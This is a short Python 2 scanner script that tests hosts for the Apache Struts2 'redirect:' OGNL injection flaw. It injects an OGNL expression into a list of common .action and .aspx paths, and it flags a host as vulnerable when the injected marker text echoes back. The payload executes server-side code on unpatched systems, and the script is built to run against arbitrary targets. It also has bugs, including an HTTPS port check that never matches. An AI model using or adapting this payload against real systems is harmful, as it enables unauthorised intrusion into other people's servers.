#!/usr/bin/python
#coding:utf-8
#create by l137

import MySQLdb
import time
import urllib2
import threading
import Queue
import sys


def exec_struts(url):
    date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'}
    
    payload = "?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[shit]'),%23w.flush(),%23w.close()}"
    url_payload = url+payload
    req = urllib2.Request(url_payload,headers=headers)
    try:
        info = urllib2.urlopen(req,timeout=5).read()
        if "shit" in info and "DOCTYPE" not in info and "html" not in info and "returnurl" not in info:
            return date,url,"1","vulner~wakaka"
    except Exception,e:
        pass
def main(url):
    date,url,warning,info = exec_struts(url)


def execMain(url):
    #action链接列表
    actionlist = ["/index.action","/test.action","/home.action","/default.action","/client.action","/callback.action","/index.aspx","/test.aspx","/login.aspx"]
    urllist = []
    for action in actionlist:
        urllist.append(url+action)
    for url in urllist:
        print exec_struts(url)

if __name__ == "__main__":
    if len(sys.argv) == 3:        
        target = sys.argv[1]
        port = sys.argv[2]
        if port == 443:
            url = "https://"+target
        else:
            url = "http://"+target+":"+port
        execMain(url)
